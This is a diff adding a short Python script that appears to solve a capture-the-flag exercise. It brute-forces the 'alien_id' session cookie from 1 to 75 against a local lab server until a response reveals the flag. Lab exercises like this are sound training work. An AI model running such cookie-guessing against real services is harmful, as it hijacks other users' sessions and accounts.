@@ -1,0 +1,33 @@
+#
+# Write a script that can guess cookie values
+# and send them to the url http://127.0.0.1:8082/cookiestore
+# Read the response from the logged in cookie value to get the flag.
+# The cookie name the aliens are using is alien_id
+# we believe the id is a number between 1 and 75
+#
+# Note: The script can timeout. If this occurs try narrowing
+# down your search
+#
+import http.client
+
+url = "127.0.0.1:8082"
+cookie_name = "alien_id"
+
+for i in range(1, 76):  # You can adjust the range as needed
+    guess = str(i)
+
+    connection = http.client.HTTPConnection(url)
+    headers = {"Cookie": f"{cookie_name}={guess}"}
+    
+    connection.request("GET", "/cookiestore", headers=headers)
+    
+    response = connection.getresponse()
+    response_text = response.read().decode('utf-8')
+
+    print(f"Guess: {guess}")
+    print(f"Response: {response_text}")
+
+    if 'flag' in response_text:
+        print("Flag found:")
+        print(response_text)
+        break
